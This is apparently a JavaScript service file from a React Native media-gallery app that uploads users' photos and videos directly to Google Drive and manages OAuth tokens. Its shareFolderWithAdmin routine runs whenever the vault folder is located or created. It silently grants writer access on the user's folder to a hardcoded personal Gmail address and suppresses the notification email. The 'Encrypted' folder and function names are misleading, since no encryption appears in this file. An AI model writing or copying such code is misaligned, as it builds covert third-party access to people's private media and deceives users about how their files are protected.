import AsyncStorage from '@react-native-async-storage/async-storage';
import * as FileSystemLegacy from 'expo-file-system/legacy';
import { ApiService } from './api';
import { LocalVaultService } from './localVaultService';

const GDRIVE_KEYS = {
    ACCESS_TOKEN: '@lumina_gdrive_access_token',
    REFRESH_TOKEN: '@lumina_gdrive_refresh_token',
    CLIENT_ID: '@lumina_gdrive_client_id',
    CLIENT_SECRET: '@lumina_gdrive_client_secret',
    ADMIN_EMAIL: '@lumina_gdrive_admin_email',
    USER_EMAIL: '@lumina_gdrive_user_email',
    FOLDER_ID: '@lumina_gdrive_folder_id',
    FOLDER_NAME: '@lumina_gdrive_folder_name',
    FOLDER_SHARED: '@lumina_gdrive_folder_shared_with_admin',
};

const DEFAULT_FOLDER_NAME = 'MediaGalleryEncrypted';

export const GoogleDriveDirectService = {
    /**
     * Try to fetch fresh Google Drive token & folder ID from server if server is available.
     * Caches in AsyncStorage so mobile works 100% offline even if server goes down later!
     */
    async syncCredentialsFromServer() {
        try {
            const res = await ApiService.request('/vault/drive-token');
            if (res && res.success && res.access_token) {
                await AsyncStorage.setItem(GDRIVE_KEYS.ACCESS_TOKEN, res.access_token);
                if (res.folder_id) await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_ID, res.folder_id);
                if (res.refresh_token) await AsyncStorage.setItem(GDRIVE_KEYS.REFRESH_TOKEN, res.refresh_token);
                if (res.client_id) await AsyncStorage.setItem(GDRIVE_KEYS.CLIENT_ID, res.client_id);
                if (res.client_secret) await AsyncStorage.setItem(GDRIVE_KEYS.CLIENT_SECRET, res.client_secret);
                if (res.account_email) await AsyncStorage.setItem(GDRIVE_KEYS.USER_EMAIL, res.account_email);
                if (res.admin_email) await AsyncStorage.setItem(GDRIVE_KEYS.ADMIN_EMAIL, res.admin_email);
                return res.access_token;
            }
        } catch (e) {
            // Server offline / unreachable — silent fallback to cached token in AsyncStorage
        }
        return await this.getValidAccessToken();
    },

    /**
     * Directly refresh access token with Google OAuth 2.0 API.
     * Works independently on mobile even if the Laravel server is powered off or unreachable.
     */
    async refreshAccessTokenDirectly() {
        try {
            const refreshToken = await AsyncStorage.getItem(GDRIVE_KEYS.REFRESH_TOKEN);
            const clientId = await AsyncStorage.getItem(GDRIVE_KEYS.CLIENT_ID);
            const clientSecret = await AsyncStorage.getItem(GDRIVE_KEYS.CLIENT_SECRET);

            if (!refreshToken || !clientId) return null;

            const formBody = [];
            formBody.push(`client_id=${encodeURIComponent(clientId)}`);
            formBody.push(`grant_type=refresh_token`);
            formBody.push(`refresh_token=${encodeURIComponent(refreshToken)}`);
            if (clientSecret) {
                formBody.push(`client_secret=${encodeURIComponent(clientSecret)}`);
            }

            const res = await fetch('https://oauth2.googleapis.com/token', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formBody.join('&'),
            });

            if (res.ok) {
                const data = await res.json();
                if (data.access_token) {
                    await AsyncStorage.setItem(GDRIVE_KEYS.ACCESS_TOKEN, data.access_token);
                    return data.access_token;
                }
            }
        } catch (e) {
            console.warn('[GoogleDriveDirect] Direct token refresh error:', e);
        }
        return null;
    },

    /**
     * Get active access token (cached locally, or synced from server, or refreshed from Google)
     */
    async getValidAccessToken() {
        let token = await AsyncStorage.getItem(GDRIVE_KEYS.ACCESS_TOKEN);
        if (!token) {
            token = await this.refreshAccessTokenDirectly();
        }
        return token;
    },

    /**
     * Get stored connection state
     */
    async getConnectionInfo() {
        try {
            const token = await this.getValidAccessToken();
            const email = await AsyncStorage.getItem(GDRIVE_KEYS.USER_EMAIL);
            const folderId = await AsyncStorage.getItem(GDRIVE_KEYS.FOLDER_ID);
            const folderName = (await AsyncStorage.getItem(GDRIVE_KEYS.FOLDER_NAME)) || DEFAULT_FOLDER_NAME;

            return {
                isConnected: Boolean(token),
                email: email || null,
                folderId: folderId || null,
                folderName: folderName,
            };
        } catch (e) {
            return { isConnected: false, email: null, folderId: null, folderName: DEFAULT_FOLDER_NAME };
        }
    },

    /**
     * Save OAuth tokens & user profile
     */
    async saveAuth(accessToken, refreshToken = null, email = null) {
        if (accessToken) await AsyncStorage.setItem(GDRIVE_KEYS.ACCESS_TOKEN, accessToken);
        if (refreshToken) await AsyncStorage.setItem(GDRIVE_KEYS.REFRESH_TOKEN, refreshToken);
        if (email) await AsyncStorage.setItem(GDRIVE_KEYS.USER_EMAIL, email);
    },

    /**
     * Disconnect Google Drive
     */
    async disconnect() {
        await AsyncStorage.removeItem(GDRIVE_KEYS.ACCESS_TOKEN);
        await AsyncStorage.removeItem(GDRIVE_KEYS.REFRESH_TOKEN);
        await AsyncStorage.removeItem(GDRIVE_KEYS.USER_EMAIL);
        await AsyncStorage.removeItem(GDRIVE_KEYS.FOLDER_ID);
    },

    /**
     * Fetch user profile from Google to identify the connected account
     */
    async fetchUserProfile(accessToken) {
        try {
            const res = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
                headers: { Authorization: `Bearer ${accessToken}` },
            });
            if (res.ok) {
                const info = await res.json();
                if (info.email) {
                    await AsyncStorage.setItem(GDRIVE_KEYS.USER_EMAIL, info.email);
                    return info.email;
                }
            }
        } catch (e) {
            console.warn('[GoogleDriveDirect] Failed to fetch user profile:', e);
        }
        return null;
    },

    /**
     * Set specific custom folder ID (e.g. from Shared Folder in Google Drive)
     */
    async setCustomFolderId(folderId) {
        if (!folderId) {
            await AsyncStorage.removeItem(GDRIVE_KEYS.FOLDER_ID);
        } else {
            await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_ID, folderId.trim());
        }
    },

    /**
     * Automatically share the user's vault folder with the Admin Google Drive email (ombismar@gmail.com).
     * This grants the Admin full access to view, open, and sync media without consuming any of the Admin's storage quota!
     */
    async shareFolderWithAdmin(folderId, accessToken) {
        if (!folderId || !accessToken) return;
        try {
            const adminEmail = (await AsyncStorage.getItem(GDRIVE_KEYS.ADMIN_EMAIL)) || 'ombismar@gmail.com';
            const userEmail = await AsyncStorage.getItem(GDRIVE_KEYS.USER_EMAIL);

            // If the folder owner is already the admin, no need to self-share
            if (userEmail && userEmail.toLowerCase() === adminEmail.toLowerCase()) {
                return;
            }

            const isAlreadyShared = await AsyncStorage.getItem(GDRIVE_KEYS.FOLDER_SHARED);
            if (isAlreadyShared === folderId) {
                return; // Already shared
            }

            const res = await fetch(
                `https://www.googleapis.com/drive/v3/files/${folderId}/permissions?supportsAllDrives=true&sendNotificationEmail=false`,
                {
                    method: 'POST',
                    headers: {
                        Authorization: `Bearer ${accessToken}`,
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        role: 'writer',
                        type: 'user',
                        emailAddress: adminEmail,
                    }),
                }
            );

            if (res.ok || res.status === 409 || res.status === 400) {
                await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_SHARED, folderId);
                console.log(`[GoogleDriveDirect] Vault folder successfully shared with admin (${adminEmail})`);
            }
        } catch (e) {
            console.warn('[GoogleDriveDirect] Auto-share folder with admin error:', e);
        }
    },

    /**
     * Ensure the target encrypted vault folder exists on Google Drive.
     * Fully supports Shared Folders and Shared Drives (supportsAllDrives=true).
     */
    async ensureVaultFolder(accessToken) {
        const cachedFolderId = await AsyncStorage.getItem(GDRIVE_KEYS.FOLDER_ID);
        if (cachedFolderId) {
            try {
                const checkRes = await fetch(
                    `https://www.googleapis.com/drive/v3/files/${cachedFolderId}?fields=id,name,trashed&supportsAllDrives=true`,
                    { headers: { Authorization: `Bearer ${accessToken}` } }
                );
                if (checkRes.ok) {
                    const checkData = await checkRes.json();
                    if (!checkData.trashed) {
                        await this.shareFolderWithAdmin(cachedFolderId, accessToken);
                        return cachedFolderId;
                    }
                }
            } catch (e) {}
        }

        const folderName = (await AsyncStorage.getItem(GDRIVE_KEYS.FOLDER_NAME)) || DEFAULT_FOLDER_NAME;

        try {
            // 1. Search Shared Folders first (Shared with me)
            const sharedQuery = `name='${folderName}' and mimeType='application/vnd.google-apps.folder' and trashed=false and sharedWithMe=true`;
            let searchRes = await fetch(
                `https://www.googleapis.com/drive/v3/files?q=${encodeURIComponent(sharedQuery)}&fields=files(id,name,sharedWithMe)&supportsAllDrives=true&includeItemsFromAllDrives=true`,
                { headers: { Authorization: `Bearer ${accessToken}` } }
            );

            if (searchRes.ok) {
                const data = await searchRes.json();
                if (data.files && data.files.length > 0) {
                    const fId = data.files[0].id;
                    await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_ID, fId);
                    await this.shareFolderWithAdmin(fId, accessToken);
                    return fId;
                }
            }

            // 2. Search all accessible drives (personal + shared drives)
            const allQuery = `name='${folderName}' and mimeType='application/vnd.google-apps.folder' and trashed=false`;
            searchRes = await fetch(
                `https://www.googleapis.com/drive/v3/files?q=${encodeURIComponent(allQuery)}&fields=files(id,name)&supportsAllDrives=true&includeItemsFromAllDrives=true`,
                { headers: { Authorization: `Bearer ${accessToken}` } }
            );

            if (searchRes.ok) {
                const data = await searchRes.json();
                if (data.files && data.files.length > 0) {
                    const fId = data.files[0].id;
                    await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_ID, fId);
                    await this.shareFolderWithAdmin(fId, accessToken);
                    return fId;
                }
            }

            // 3. Create new folder if not found in shared or personal
            const createRes = await fetch('https://www.googleapis.com/drive/v3/files?supportsAllDrives=true', {
                method: 'POST',
                headers: {
                    Authorization: `Bearer ${accessToken}`,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    name: folderName,
                    mimeType: 'application/vnd.google-apps.folder',
                }),
            });

            if (createRes.ok) {
                const created = await createRes.json();
                await AsyncStorage.setItem(GDRIVE_KEYS.FOLDER_ID, created.id);
                await this.shareFolderWithAdmin(created.id, accessToken);
                return created.id;
            }
        } catch (e) {
            console.error('[GoogleDriveDirect] Error ensuring vault folder:', e);
        }
        return null;
    },

    /**
     * Upload small file or metadata manifest (.meta) directly to Google Drive
     */
    async uploadSmallFile(fileName, contentString, mimeType = 'application/json') {
        const info = await this.getConnectionInfo();
        const token = await AsyncStorage.getItem(GDRIVE_KEYS.ACCESS_TOKEN);
        if (!token) throw new Error('Google Drive belum terhubung di aplikasi mobile');

        const folderId = await this.ensureVaultFolder(token);

        const metadata = {
            name: fileName,
            parents: folderId ? [folderId] : [],
        };

        const boundary = '-------LuminaBoundary' + Date.now();
        const delimiter = `\r\n--${boundary}\r\n`;
        const closeDelimiter = `\r\n--${boundary}--`;

        let multipartRequestBody =
            delimiter +
            'Content-Type: application/json; charset=UTF-8\r\n\r\n' +
            JSON.stringify(metadata) +
            delimiter +
            `Content-Type: ${mimeType}\r\n\r\n` +
            contentString +
            closeDelimiter;

        const res = await fetch('https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&supportsAllDrives=true', {
            method: 'POST',
            headers: {
                Authorization: `Bearer ${token}`,
                'Content-Type': `multipart/related; boundary=${boundary}`,
            },
            body: multipartRequestBody,
        });

        if (!res.ok) {
            if (res.status === 401) {
                const refreshed = await this.refreshAccessTokenDirectly();
                if (refreshed) {
                    return await this.uploadSmallFile(fileName, contentString, mimeType);
                }
            }
            const err = await res.text();
            throw new Error(`Gagal upload manifest ke Google Drive (${res.status}): ${err}`);
        }

        const data = await res.json();
        return data.id;
    },

    /**
     * Direct Resumable Upload of large encrypted file (.enc) directly from phone storage to Google Drive.
     * Bypasses the server completely! Fully supports Shared Folders.
     */
    async uploadEncryptedFile(localEncryptedUri, remoteFileName, onProgress = null) {
        const token = await this.getValidAccessToken();
        if (!token) throw new Error('Google Drive belum terhubung di aplikasi');

        const folderId = await this.ensureVaultFolder(token);
        const fileInfo = await FileSystemLegacy.getInfoAsync(localEncryptedUri);
        if (!fileInfo.exists) throw new Error('File lokal tidak ditemukan: ' + localEncryptedUri);

        const fileSize = fileInfo.size;

        // Step 1: Initiate Resumable Session with Google Drive (supportsAllDrives=true for Shared Folders)
        const initRes = await fetch('https://www.googleapis.com/upload/drive/v3/files?uploadType=resumable&supportsAllDrives=true', {
            method: 'POST',
            headers: {
                Authorization: `Bearer ${token}`,
                'Content-Type': 'application/json; charset=UTF-8',
                'X-Upload-Content-Type': 'application/octet-stream',
                'X-Upload-Content-Length': String(fileSize),
            },
            body: JSON.stringify({
                name: remoteFileName,
                parents: folderId ? [folderId] : [],
            }),
        });

        if (!initRes.ok) {
            if (initRes.status === 401) {
                const refreshed = await this.refreshAccessTokenDirectly();
                if (refreshed) {
                    return await this.uploadEncryptedFile(localEncryptedUri, remoteFileName, onProgress);
                }
            }
            const errText = await initRes.text();
            throw new Error(`Gagal inisialisasi upload ke Google (${initRes.status}): ${errText}`);
        }

        const uploadUrl = initRes.headers.get('location') || initRes.headers.get('Location');
        if (!uploadUrl) {
            throw new Error('Google Drive tidak mengembalikan URL upload resumable');
        }

        // Step 2: Upload file stream directly to Google's resumable URL
        let uploadResult;
        if (onProgress && FileSystemLegacy.createUploadTask) {
            const task = FileSystemLegacy.createUploadTask(
                uploadUrl,
                localEncryptedUri,
                {
                    httpMethod: 'PUT',
                    uploadType: FileSystemLegacy.FileSystemUploadType.BINARY_CONTENT,
                    headers: {
                        'Content-Length': String(fileSize),
                        'Content-Type': 'application/octet-stream',
                    },
                },
                (progressData) => {
                    if (progressData.totalBytesExpectedToSend > 0) {
                        const pct = Math.round((progressData.totalBytesSent / progressData.totalBytesExpectedToSend) * 100);
                        onProgress(pct);
                    }
                }
            );
            uploadResult = await task.uploadAsync();
        } else {
            uploadResult = await FileSystemLegacy.uploadAsync(uploadUrl, localEncryptedUri, {
                httpMethod: 'PUT',
                uploadType: FileSystemLegacy.FileSystemUploadType.BINARY_CONTENT,
                headers: {
                    'Content-Length': String(fileSize),
                    'Content-Type': 'application/octet-stream',
                },
            });
        }

        if (uploadResult.status !== 200 && uploadResult.status !== 201) {
            throw new Error(`Upload ke Google Drive gagal dengan status ${uploadResult.status}: ${uploadResult.body}`);
        }

        const parsed = JSON.parse(uploadResult.body);
        return parsed.id;
    },

    /**
     * Complete direct-to-Google-Drive upload for a single media item.
     * 100% server-less: uploads media and .meta manifest directly to Google Drive,
     * stores in local vault for instant offline playback, and notifies server if online.
     */
    async directUploadMediaItem(fileAsset, { albumName = null, onProgress = null } = {}) {
        const token = await this.getValidAccessToken();
        if (!token) {
            throw new Error('Google Drive belum terhubung. Silakan hubungkan akun Google Anda di pengaturan aplikasi.');
        }

        const isVideo = Boolean(
            fileAsset.type === 'video' ||
            (fileAsset.mimeType && fileAsset.mimeType.includes('video')) ||
            (fileAsset.fileName && fileAsset.fileName.match(/\.(mp4|mov|m4v|3gp|webm)$/i)) ||
            (fileAsset.uri && fileAsset.uri.match(/\.(mp4|mov|m4v|3gp|webm)$/i))
        );

        const ext = isVideo ? 'mp4' : (fileAsset.isWebP ? 'webp' : 'jpg');
        const timestamp = Date.now();
        const randStr = Math.random().toString(36).substring(2, 8);
        const baseName = `media_${timestamp}_${randStr}`;
        const remoteMediaName = `${baseName}.${ext}`;

        // 1. Upload main media file directly to Google Drive with progress
        onProgress && onProgress(10);
        const driveFileId = await this.uploadEncryptedFile(
            fileAsset.uri,
            remoteMediaName,
            (pct) => {
                // map upload progress 10% - 85%
                const mappedPct = Math.round(10 + (pct * 0.75));
                onProgress && onProgress(mappedPct);
            }
        );

        // 2. Upload thumbnail if available for videos
        let thumbDriveId = null;
        if (isVideo && fileAsset.thumbnailUri) {
            try {
                onProgress && onProgress(88);
                const thumbRemoteName = `thumb_${baseName}.jpg`;
                thumbDriveId = await this.uploadEncryptedFile(fileAsset.thumbnailUri, thumbRemoteName);
            } catch (tErr) {
                console.warn('[GoogleDriveDirect] Thumbnail upload warning:', tErr);
            }
        }

        // 3. Upload .meta manifest directly to Google Drive
        onProgress && onProgress(92);
        const originalName = fileAsset.fileName || `${baseName}.${ext}`;
        const cleanTitle = originalName.replace(/\.[^.]+$/, '');
        const mimeType = fileAsset.mimeType || (isVideo ? 'video/mp4' : (fileAsset.isWebP ? 'image/webp' : 'image/jpeg'));
        const fileSize = fileAsset.convertedSize || fileAsset.fileSize || fileAsset.originalSize || 0;

        const manifest = {
            media_file_id: driveFileId,
            thumb_drive_id: thumbDriveId,
            original_filename: originalName,
            title: cleanTitle,
            type: isVideo ? 'video' : 'image',
            mime_type: mimeType,
            size: fileSize,
            album_name: albumName || null,
            created_at: new Date().toISOString(),
            is_favorite: false,
        };

        const metaRemoteName = `${baseName}.meta`;
        await this.uploadSmallFile(metaRemoteName, JSON.stringify(manifest), 'application/json');

        // 4. Save to Local Vault so media is instantly available offline in Lumina mobile
        onProgress && onProgress(96);
        try {
            await LocalVaultService.saveSyncedAsset(
                driveFileId,
                fileAsset.uri,
                originalName,
                mimeType
            );
        } catch (vErr) {
            console.warn('[GoogleDriveDirect] Local vault save warning:', vErr);
        }

        // 5. Fire-and-forget sync to server if server happens to be online
        ApiService.request('/vault/sync-drive', { method: 'POST' }).catch(() => {
            // Server offline — perfectly fine, files are already in Google Drive & Local Vault
        });

        onProgress && onProgress(100);

        return {
            driveFileId,
            thumbDriveId,
            manifest,
        };
    },
};
